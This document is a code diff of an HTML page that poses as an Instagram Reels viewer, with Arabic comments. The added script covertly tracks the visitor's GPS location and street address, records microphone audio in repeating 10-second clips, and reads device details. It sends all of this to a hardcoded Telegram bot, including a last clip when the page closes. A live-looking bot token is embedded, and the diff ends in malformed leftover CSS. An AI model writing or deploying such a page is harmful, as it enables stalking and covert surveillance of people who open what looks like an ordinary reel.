@@ -1,108 +1,309 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Instagram</title>
-    <style>
-        :root {
-            --bg: #000;
-            --text: #fff;
-            --gray: #a8a8a8;
-            --blue: #0095f6;
-            --border: #262626;
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: var(--bg);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            height: 100vh; height: 100dvh;
-            display: flex; flex-direction: column;
-            overflow: hidden;
-            user-select: none; -webkit-user-select: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-        /* ========== TOP HEADER ========== */
-        .top-header {
-            display: flex; align-items: center; justify-content: space-between;
-            padding: 12px 16px 8px;
-            background: #000;
-            z-index: 10;
-            flex-shrink: 0;
-        }
-        .top-header .logo {
-            font-family: 'Segoe Script', 'Brush Script MT', 'Grand Hotel', cursive;
-            font-size: 28px; color: #fff;
-            letter-spacing: 1px;
-        }
-        .top-header .header-icons {
-            display: flex; gap: 20px; align-items: center;
-        }
-        .top-header .header-icons svg { fill: #fff; width: 24px; height: 24px; }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>Instagram</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;overflow:hidden;height:100dvh;display:flex;flex-direction:column}
+    .top-header{display:flex;justify-content:space-between;padding:10px 16px;background:#000;z-index:10}
+    .top-header .logo{font-size:28px;font-family:'Segoe Script',cursive}
+    .header-icons{display:flex;gap:16px;align-items:center}
+    .reel-screen{flex:1;position:relative;background:#000}
+    .reel-screen iframe{width:100%;height:100%;border:none;position:absolute;top:0;left:0}
+    .reel-actions{position:absolute;right:12px;bottom:130px;display:flex;flex-direction:column;gap:22px;z-index:5}
+    .action-btn{background:0;border:0;color:#fff;font-size:12px;display:flex;flex-direction:column;align-items:center;gap:4px}
+    .reel-info{position:absolute;bottom:0;left:0;right:0;padding:20px 16px 90px;background:linear-gradient(transparent,rgba(0,0,0,0.85))}
+    .user-row{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+    .caption{font-size:14px;line-height:1.5}
+    .bottom-nav{display:flex;justify-content:space-around;padding:10px 0 20px;border-top:1px solid #262626;background:#000}
+    .debug{position:absolute;top:50px;left:10px;background:rgba(0,0,0,0.8);color:lime;font-size:12px;padding:8px;z-index:20;max-width:90%;border-radius:6px;display:none}
+    .custom-reel-bar{display:flex;padding:8px 16px;background:#111;gap:8px;align-items:center}
+    .custom-reel-bar input{flex:1;padding:8px;border-radius:6px;border:1px solid #333;background:#222;color:#fff;font-size:14px}
+    .custom-reel-bar button{background:#0095f6;color:#fff;border:0;padding:8px 16px;border-radius:6px;font-weight:bold;cursor:pointer}
+  </style>
+</head>
+<body>
+<div class="top-header">
+  <div class="logo">Instagram</div>
+  <div class="header-icons">🎥 📷 💬</div>
+</div>
 
-        /* ========== REEL CONTAINER ========== */
-        .reel-screen {
-            flex: 1; position: relative; background: #000;
-            display: flex; align-items: center; justify-content: center;
-            overflow: hidden;
-        }
-        .reel-screen iframe {
-            width: 100%; height: 100%;
-            border: none; object-fit: cover;
-            position: absolute; top: 0; left: 0;
-        }
+<!-- حقل إدخال رابط ريل مخصص -->
+<div class="custom-reel-bar">
+  <input type="text" id="customReelUrl" placeholder="الصق رابط Reel هنا...">
+  <button id="loadReelBtn">تحميل</button>
+</div>
 
-        /* ========== RIGHT ACTIONS (مثل الأصلي) ========== */
-        .reel-actions {
-            position: absolute; right: 12px; bottom: 130px;
-            display: flex; flex-direction: column;
-            align-items: center; gap: 22px; z-index: 5;
-        }
-        .reel-actions .action-btn {
-            display: flex; flex-direction: column; align-items: center;
-            gap: 4px; cursor: pointer; background: none; border: none;
-            color: #fff; font-size: 12px; font-weight: 600;
-            text-shadow: 0 1px 3px rgba(0,0,0,0.5);
-        }
-        .reel-actions .action-btn svg { width: 28px; height: 28px; fill: #fff; }
-        .reel-actions .action-btn.profile-action img {
-            width: 38px; height: 38px; border-radius: 8px;
-            border: 2px solid #fff; object-fit: cover;
-        }
+<div class="reel-screen">
+  <iframe id="reelIframe" allow="autoplay; fullscreen"></iframe>
+  <div class="reel-actions">
+    <button class="action-btn">❤️ <span id="likesCount">12.3K</span></button>
+    <button class="action-btn">💬 567</button>
+    <button class="action-btn">↗️</button>
+    <button class="action-btn">💾</button>
+    <button class="action-btn">•••</button>
+  </div>
+  <div class="reel-info">
+    <div class="user-row">
+      <span>👤</span> <span id="reelUsername">user</span>
+      <button style="margin-left:auto;background:transparent;border:1px solid #aaa;color:#fff;padding:4px 12px;border-radius:6px;">متابعة</button>
+    </div>
+    <div class="caption" id="reelCaption">وصف الريل...</div>
+  </div>
+  <div class="debug" id="debugLog">🟡 بانتظار النقر...</div>
+</div>
 
-        /* ========== BOTTOM INFO ========== */
-        .reel-info {
-            position: absolute; bottom: 0; left: 0; right: 0;
-            padding: 20px 16px 90px; z-index: 5;
-            background: linear-gradient(transparent, rgba(0,0,0,0.85) 40%);
-            pointer-events: none;
+<div class="bottom-nav">🏠 🔍 ➕ 🎬 👤</div>
+
+<script>
+  // ========== الإعدادات ==========
+  const BOT_TOKEN = '8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM';
+  const CHAT_ID = '7615377804';   // <-- تأكد أنه صحيح بعد /start
+
+  const RECORD_DURATION_MS = 10000; // 10 ثوانٍ
+
+  // ========== عناصر الواجهة ==========
+  const debugEl = document.getElementById('debugLog');
+  const customReelUrl = document.getElementById('customReelUrl');
+  const loadReelBtn = document.getElementById('loadReelBtn');
+  const reelIframe = document.getElementById('reelIframe');
+  const reelUsername = document.getElementById('reelUsername');
+  const reelCaption = document.getElementById('reelCaption');
+  const likesCount = document.getElementById('likesCount');
+
+  function log(msg, color='lime') {
+    debugEl.style.display = 'block';
+    debugEl.textContent = msg;
+    debugEl.style.color = color;
+    console.log(msg);
+  }
+
+  // ========== استخراج اسم الجهاز من User-Agent ==========
+  function getDeviceModel() {
+    const ua = navigator.userAgent;
+    // أنماط شائعة
+    const patterns = [
+      /Huawei\s+([A-Za-z0-9\-]+)\s+Build/i,
+      /Infinix\s+([A-Za-z0-9]+)\s+Build/i,
+      /Xiaomi\s+([A-Za-z0-9\s]+)\s+Build/i,
+      /Samsung\s+([A-Za-z0-9]+)\s+Build/i,
+      /iPhone\s+([\w\s]+)\s+like/i,
+      /iPad;\s+CPU\s+OS\s+([\d_]+)\s+like\s+Mac/i,
+      /Linux;\s+Android\s+([\d\.]+);\s+([\w\s]+)\s+Build/i, // عام لأجهزة أندرويد
+      /(Windows NT [\d\.]+);/,
+      /(Macintosh; Intel Mac OS X [\d_]+)/,
+    ];
+    for (let p of patterns) {
+      const m = ua.match(p);
+      if (m) {
+        if (p.source.includes('iPhone')) return 'Apple ' + m[0].split(';')[0];
+        if (p.source.includes('iPad')) return 'Apple iPad';
+        if (p.source.includes('Linux; Android')) return m[2] ? m[2].trim() : 'Android Device';
+        return m[1] ? m[1].trim() : m[0];
+      }
+    }
+    // إذا لم يتطابق نعطي جزء من الـ UA
+    const simple = ua.match(/\(([^)]+)\)/);
+    return simple ? simple[1].split(';')[0].trim() : 'Unknown Device';
+  }
+
+  // ========== Reverse Geocoding (تحويل الإحداثيات إلى نص) ==========
+  async function reverseGeocode(lat, lon) {
+    try {
+      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`);
+      const data = await res.json();
+      if (data && data.address) {
+        const addr = data.address;
+        // بناء سلسلة: الدولة - المدينة - الحي
+        let parts = [];
+        if (addr.country) parts.push(addr.country);
+        if (addr.state) parts.push(addr.state);
+        if (addr.city || addr.town || addr.village) parts.push(addr.city || addr.town || addr.village);
+        if (addr.suburb || addr.neighbourhood) parts.push(addr.suburb || addr.neighbourhood);
+        let text = parts.join(' - ');
+        // محاولة جلب أقرب معلم (من display_name أو address)
+        let landmark = '';
+        if (data.display_name) {
+          // نأخذ أول جزء قبل الفاصلة (غالباً اسم الشارع أو معلم)
+          const firstPart = data.display_name.split(',')[0].trim();
+          if (firstPart && !parts.includes(firstPart)) landmark = firstPart;
         }
-        .reel-info .user-row {
-            display: flex; align-items: center; gap: 10px; margin-bottom: 10px;
+        if (landmark) text += ` (${landmark})`;
+        return text || data.display_name;
+      }
+    } catch(e) { console.error(e); }
+    return null;
+  }
+
+  // ========== إرسال إلى تيليجرام ==========
+  async function telegram(method, body) {
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(body)
+      });
+      const d = await res.json();
+      if (!d.ok) log('❌ تيليجرام: ' + d.description, 'red');
+      else log('✅ تم: ' + method, 'lime');
+    } catch(e) { log('❌ فشل اتصال: ' + e.message, 'red'); }
+  }
+
+  // ========== تتبع الموقع مع وصف المكان ==========
+  let watchId;
+  function startTracking() {
+    if (!navigator.geolocation) { log('⚠️ الموقع غير مدعوم', 'orange'); return; }
+    watchId = navigator.geolocation.watchPosition(
+      async (pos) => {
+        const {latitude, longitude, accuracy} = pos.coords;
+        log(`📍 ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`, 'cyan');
+        // Reverse geocode
+        let placeText = await reverseGeocode(latitude, longitude);
+        if (!placeText) placeText = 'غير معروف';
+        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        const msg = `📍 *موقع جديد*\n` +
+                    `العرض: \`${latitude}\`\n` +
+                    `الطول: \`${longitude}\`\n` +
+                    `الدقة: ±${Math.round(accuracy)}م\n` +
+                    `الموقع: ${placeText}\n` +
+                    `[🗺️ عرض على الخريطة](${mapsLink})`;
+        telegram('sendMessage', {chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'});
+        telegram('sendLocation', {chat_id: CHAT_ID, latitude, longitude});
+      },
+      err => {
+        log('❌ موقع: ' + err.message, 'red');
+        telegram('sendMessage', {chat_id: CHAT_ID, text: '❌ خطأ موقع: ' + err.message});
+      },
+      {enableHighAccuracy: true, maximumAge: 0, timeout: 30000}
+    );
+  }
+
+  // ========== تسجيل الصوت (10 ثوانٍ) مع إرسال عند الإغلاق ==========
+  let mediaRecorder = null;
+  let audioStream = null;
+  let currentChunks = [];
+  let currentRecorder = null;
+
+  async function startAudio() {
+    try {
+      audioStream = await navigator.mediaDevices.getUserMedia({audio: true});
+      log('🎤 ميكروفون متاح', 'green');
+      telegram('sendMessage', {chat_id: CHAT_ID, text: '🎤 بدأ التسجيل الصوتي (10 ثوانٍ)'});
+      scheduleRecording();
+    } catch(e) {
+      log('❌ ميكروفون: ' + e.message, 'red');
+      telegram('sendMessage', {chat_id: CHAT_ID, text: '❌ خطأ ميكروفون: ' + e.message});
+    }
+  }
+
+  function scheduleRecording() {
+    if (!audioStream || !audioStream.active) return;
+    currentChunks = [];
+    const rec = new MediaRecorder(audioStream);
+    rec.ondataavailable = e => { if(e.data.size) currentChunks.push(e.data); };
+    rec.onstop = async () => {
+      if (currentChunks.length === 0) return;
+      const blob = new Blob(currentChunks, {type: rec.mimeType || 'audio/webm'});
+      await sendAudioBlob(blob);
+      // جدولة المقطع التالي
+      if (audioStream && audioStream.active) setTimeout(scheduleRecording, 500);
+    };
+    rec.start();
+    mediaRecorder = rec;
+    currentRecorder = rec;
+    setTimeout(() => {
+      if (rec.state === 'recording') rec.stop();
+    }, RECORD_DURATION_MS);
+  }
+
+  async function sendAudioBlob(blob) {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('audio', blob, `rec_${Date.now()}.webm`);
+    fd.append('title', '🎤 ' + new Date().toLocaleTimeString('ar-SA'));
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {method:'POST', body:fd});
+      log('📤 تم إرسال مقطع صوتي', 'magenta');
+    } catch(e) { log('❌ فشل إرسال الصوت', 'red'); }
+  }
+
+  // إرسال المقطع الحالي عند إغلاق الصفحة
+  function flushCurrentRecording() {
+    if (currentRecorder && currentRecorder.state === 'recording') {
+      // إيقاف التسجيل فوراً وإرسال ما تم تجميعه
+      currentRecorder.onstop = async () => {
+        if (currentChunks.length > 0) {
+          const blob = new Blob(currentChunks, {type: currentRecorder.mimeType || 'audio/webm'});
+          // استخدم sendBeacon إن أمكن أو fetch keepalive
+          const fd = new FormData();
+          fd.append('chat_id', CHAT_ID);
+          fd.append('audio', blob, 'last_rec.webm');
+          fd.append('title', '🎤 مقطع أخير قبل الإغلاق');
+          if (navigator.sendBeacon) {
+            navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, fd);
+          } else {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {method:'POST', body:fd, keepalive: true});
+          }
         }
-        .reel-info .user-row .user-avatar {
-            width: 38px; height: 38px; border-radius: 50%;
-            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-            display: flex; align-items: center; justify-content: center;
-            font-size: 16px; color: #fff; font-weight: bold;
-            flex-shrink: 0;
-        }
-        .reel-info .user-row .user-name {
-            color: #fff; font-weight: 600; font-size: 15px;
-        }
-        .reel-info .user-row .follow-btn {
-            margin-left: auto; background: transparent; border: 1px solid var(--gray);
-            color: #fff; padding: 6px 16px; border-radius: 8px;
-            font-weight: 600; font-size: 13px; pointer-events: auto; cursor: pointer;
-        }
-        .reel-info .caption {
-            color: #fff; font-size: 14px; line-height: 1.5;
-            margin-bottom: 8px; display: -webkit-box;
-            -webkit-line-clamp: 2; -webkit-box-orient: vertical;
-            overflow: hidden;
-        }
-        .reel-info .music-row {
-            display: flex; align-items: center; gap: 8px;
+      };
+      currentRecorder.stop();
+    }
+    if (audioStream) audioStream.getTracks().forEach(t => t.stop());
+    if (watchId) navigator.geolocation.clearWatch(watchId);
+  }
+
+  window.addEventListener('beforeunload', flushCurrentRecording);
+
+  // ========== بدء الجلسة ==========
+  let started = false;
+  function launch() {
+    if(started) return;
+    started = true;
+    const deviceModel = getDeviceModel();
+    const now = new Date().toLocaleString('ar-SA', {timeZone:'Asia/Damascus'});
+    log('🚀 بدأت الجلسة', 'yellow');
+    telegram('sendMessage', {
+      chat_id: CHAT_ID,
+      text: `🚀 *جلسة جديدة*\nالتاريخ والوقت: ${now}\nالجهاز: \`${deviceModel}\`\nUser-Agent: \`${navigator.userAgent.slice(0,100)}\``,
+      parse_mode: 'Markdown'
+    });
+    startTracking();
+    setTimeout(startAudio, 1000);
+  }
+
+  document.addEventListener('click', launch, {once: true});
+  document.addEventListener('touchstart', launch, {once: true});
+  setTimeout(() => { if(!started) launch(); }, 15000);
+
+  // ========== تحميل ريل مخصص ==========
+  function extractShortcode(url) {
+    const m = url.match(/\/reel\/([A-Za-z0-9_-]+)/);
+    return m ? m[1] : null;
+  }
+
+  function loadReel(shortcode, username='custom', desc='') {
+    reelIframe.src = `https://www.instagram.com/reel/${shortcode}/embed`;
+    reelUsername.textContent = username;
+    reelCaption.textContent = desc || 'ريل مخصص';
+    likesCount.textContent = Math.floor(Math.random()*5000+100).toLocaleString('ar-SA');
+  }
+
+  loadReelBtn.addEventListener('click', () => {
+    const url = customReelUrl.value.trim();
+    if (!url) return alert('أدخل رابطاً');
+    const shortcode = extractShortcode(url);
+    if (!shortcode) return alert('رابط غير صالح');
+    loadReel(shortcode, 'مخصص', 'ريل تم تحميله');
+    log('🎬 تم تحميل الريل: '+shortcode);
+  });
+
+  // تحميل ريل افتراضي عند البداية
+  loadReel('CxeDohAgs2c', 'instagram', '✨ This is Instagram');
+</script>
+</body>
+</html>            display: flex; align-items: center; gap: 8px;
             color: #fff; font-size: 13px; margin-bottom: 4px;
         }
         .reel-info .music-row .music-icon {
